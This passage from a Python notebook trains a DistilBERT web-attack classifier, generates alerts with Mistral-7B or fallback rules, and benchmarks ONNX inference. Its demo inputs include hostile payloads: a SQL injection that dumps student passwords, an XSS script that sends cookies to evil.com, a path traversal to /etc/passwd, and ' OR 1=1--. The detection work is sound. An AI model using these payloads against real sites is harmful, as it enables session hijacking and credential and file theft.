        logger.warning('HF API %d: %s', resp.status_code, resp.text[:150])
        return None
    except Exception as e:
        logger.warning('Mistral API error: %s', e)
        return None

def generate_alert_local(threat_class, payload, confidence):
    risk = {'SQLi':('Critical','DB compromise'),'XSS':('High','session hijacking'),
            'CommandInjection':('Critical','RCE'),'PathTraversal':('High','file exposure'),
            'CSRF':('Medium','unauthorized actions'),'BENIGN':('None','no threat')}
    rl, rd = risk.get(threat_class, ('Unknown','review manually'))
    actions = {'SQLi':'Block IP, parameterise queries, audit DB logs.',
               'XSS':'Enable CSP headers, sanitise output, block source.',
               'CommandInjection':'Isolate service, audit shell exec paths.',
               'PathTraversal':'Block IP, restrict file paths, audit endpoints.',
               'CSRF':'Enforce CSRF tokens, audit session management.',
               'BENIGN':'No action needed.'}
    return (
        f"1. THREAT SUMMARY\n   {threat_class} detected ({confidence:.1%} confidence).\n\n"
        f"2. TECHNICAL EXPLANATION\n   Payload matches known {threat_class} pattern.\n"
        f"   Snippet: '{payload[:80]}...'  Risk: {rd}.\n\n"
        f"3. IMMEDIATE ACTION\n   {actions.get(threat_class,'Block and investigate.')}\n\n"
        f"4. RISK LEVEL: {rl} — {rd}."
    )

DEMO_CASES = [
    {"payload":"' UNION SELECT student_id,password FROM students--",
     "source_ip":"196.203.45.12","target_url":"/api/search?q="},
    {"payload":"<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
     "source_ip":"77.88.55.100","target_url":"/forum/post?message="},
    {"payload":"../../../etc/passwd",
     "source_ip":"45.142.212.50","target_url":"/download?file="},
]

generated_alerts = []
print('='*65)
print('IDRS — Automated Alert Generation (Mistral-7B / Fallback)')
print('='*65)

for i, demo in enumerate(DEMO_CASES, 1):
    preds    = clf_pipeline(demo['payload'][:512])[0]
    best     = max(preds, key=lambda x: x['score'])
    threat   = best['label']
    conf     = best['score']

    print(f'\nAlert {i} | {threat} ({conf:.3f}) | Source: {demo["source_ip"]}')
    print(f'Payload: {demo["payload"][:80]}...')

    prompt = build_alert_prompt(demo['payload'],threat,conf,demo['source_ip'],demo['target_url'])
    report = generate_alert_mistral(prompt)
    source = 'Mistral-7B' if report else 'Rule-Based'
    if not report:
        report = generate_alert_local(threat, demo['payload'], conf)

    print(f'\n--- SECURITY ALERT [{source}] ---')
    for line in report.split('\n'):
        print(f'  {line}')
    print('---')
    generated_alerts.append({
        'payload':demo['payload'],'threat':threat,'confidence':round(conf,4),
        'source_ip':demo['source_ip'],'report':report,'source':source
    })

with open(OUTPUT_DIR/'generated_alerts.json','w',encoding='utf-8') as f:
    json.dump(generated_alerts, f, indent=2, ensure_ascii=False)
print(f'\nSaved: outputs/generated_alerts.json')

## CELL 9 — ONNX Export & Inference Speed Benchmark

In [ ]:
# ONNX Runtime gives 2-5x speedup over PyTorch for CPU inference
# Critical for real-time WAF integration at the university gateway.

ONNX_PATH = LLM_DIR / 'distilbert_web_classifier.onnx'
ONNX_OK   = False

try:
    distilbert_model.eval().cpu()
    sample_enc = tokeniser(
        "' OR 1=1--", return_tensors='pt', truncation=True,
        max_length=MAX_LEN, padding='max_length'
    )
    torch.onnx.export(
        distilbert_model,
        args         = (sample_enc['input_ids'], sample_enc['attention_mask']),
        f            = str(ONNX_PATH),
        input_names  = ['input_ids','attention_mask'],
        output_names = ['logits'],
        dynamic_axes = {
            'input_ids':     {0:'batch',1:'sequence'},
            'attention_mask':{0:'batch',1:'sequence'},
            'logits':        {0:'batch'},
        },
        opset_version = 14, do_constant_folding=True,
    )
    ONNX_OK = True
    print(f'ONNX exported: {ONNX_PATH}')
except Exception as e:
    print(f'ONNX export failed: {e}')
finally:
    distilbert_model.to(DEVICE)

# Inference benchmark
BENCH = ["' OR 1=1--","<script>alert(1)</script>","search=machine+learning"] * 20
distilbert_model.eval()
t0 = time.perf_counter()
for p in BENCH:
    enc = tokeniser(p, return_tensors='pt', truncation=True, max_length=MAX_LEN, padding=True)
    enc = {k:v.to(DEVICE) for k,v in enc.items()}
    with torch.no_grad():
        _ = distilbert_model(**enc).logits
pt_ms = (time.perf_counter()-t0)/len(BENCH)*1000
print(f'PyTorch inference: {pt_ms:.2f} ms/sample')

if ONNX_OK:
    try:
        import onnxruntime as ort
        sess = ort.InferenceSession(str(ONNX_PATH), providers=['CPUExecutionProvider'])
        t0 = time.perf_counter()
        for p in BENCH:
            enc = tokeniser(p, return_tensors='np', truncation=True, max_length=MAX_LEN, padding='max_length')
            _ = sess.run(None, {'input_ids':enc['input_ids'].astype(np.int64),
                                'attention_mask':enc['attention_mask'].astype(np.int64)})
        ort_ms = (time.perf_counter()-t0)/len(BENCH)*1000
        print(f'ONNX Runtime:      {ort_ms:.2f} ms/sample  (x{pt_ms/ort_ms:.1f} speedup)')
    except ImportError:
        print('onnxruntime not installed: pip install onnxruntime')

print(f'Real-time capable: {"YES" if pt_ms<50 else "CHECK GPU"} ({pt_ms:.1f}ms < 50ms threshold)')

## CELL 10 — Save Registry & Part 5 Summary

In [ ]:
llm_registry = {
    'web_threat_classifier': {
        'model_dir'  : str(LLM_DIR),
        'base_model' : MODEL_CHECKPOINT,
        'max_length' : MAX_LEN,
        'label2id'   : LABEL2ID,
        'n_classes'  : N_WEB_CLASSES,
        'test_metrics': distilbert_metrics,
        'adversarial': {'n_payloads':len(ADVERSARIAL_PAYLOADS),
                        'overall_acc':round(float(overall_acc),4),
                        'attack_rate':round(float(attack_acc),4)},
        'onnx'       : str(ONNX_PATH) if ONNX_OK else None,
        'pt_inf_ms'  : round(pt_ms, 3),
    },
    'alert_generator': {
        'primary' :'Mistral-7B-Instruct-v0.2 (HF Inference API)',
        'fallback':'Rule-based structured generator',
        'api_url' : HF_API_URL,
    },
    'training': {
        'strategy' :'Two-phase freeze then full fine-tune',
        'loss'     :'Weighted CrossEntropy + label smoothing 0.05',
        'optimizer':'AdamW + cosine LR',
        'n_train'  : len(X_tr), 'n_val': len(X_val_txt), 'n_test': len(X_te),
    },
}
with open(MODEL_DIR/'llm_registry.json','w') as f:
    json.dump(llm_registry, f, indent=2)

fig = plt.figure(figsize=(20,8))
fig.patch.set_facecolor('#0d1117')
ax = fig.add_subplot(111); ax.set_facecolor('#0d1117'); ax.axis('off')
ax.text(0.5,0.97,'IDRS PART 5 — SUMMARY',transform=ax.transAxes,ha='center',
        fontsize=20,fontweight='bold',color='white',va='top')
ax.text(0.5,0.90,'LLM Web Threat Analyser: DistilBERT Fine-Tuning | Mistral Alert Generation',
        transform=ax.transAxes,ha='center',fontsize=11,color='#8b949e',va='top')

metrics_lines = [
    f"F1 Macro      : {distilbert_metrics['f1_macro']:.4f}",
    f"ROC-AUC       : {distilbert_metrics['roc_auc']:.4f}",
    f"Adv. Detect   : {overall_acc:.3f}",
    f"Inference     : {pt_ms:.1f} ms/sample",
    f"ONNX export   : {'YES' if ONNX_OK else 'Fallback'}",
]
for i, line in enumerate(metrics_lines):
    ax.text(0.25, 0.75-i*0.09, line, transform=ax.transAxes, ha='center',
            fontsize=11, color='white', fontfamily='monospace')

per_cls_items = list(distilbert_metrics.get('per_class_f1',{}).items())
for j,(cls,f1v) in enumerate(per_cls_items):
    xp = 0.05 + j*0.155
    col = PALETTE_WEB.get(cls,'#95a5a6')
    ax.text(xp+0.07,0.26,cls,transform=ax.transAxes,ha='center',
            fontsize=8,color=col,fontweight='bold')
    ax.text(xp+0.07,0.19,f'{f1v:.3f}',transform=ax.transAxes,ha='center',
            fontsize=10,color='white',fontweight='bold')

ax.text(0.5,0.09,'Per-Class F1 Scores',transform=ax.transAxes,ha='center',
        fontsize=9,color='#8b949e')
ax.text(0.5,0.03,'-> Part 6: Automated Response Engine (threat scoring | IP blocking | playbooks | PDF reports)',
        transform=ax.transAxes,ha='center',va='bottom',
        fontsize=9,color='#f39c12',style='italic')
plt.tight_layout()
plt.savefig(OUTPUT_DIR/'part5_summary.png',bbox_inches='tight',dpi=150,facecolor='#0d1117')
plt.show()

print('='*60)
print('PART 5 COMPLETE')
print(f'  DistilBERT F1-Macro  : {distilbert_metrics["f1_macro"]:.4f}')
print(f'  Adversarial accuracy : {overall_acc:.3f}')
print(f'  ONNX exported        : {ONNX_OK}')
print('  -> Proceed to IDRS_Part6_ResponseEngine.ipynb')
print('='*60)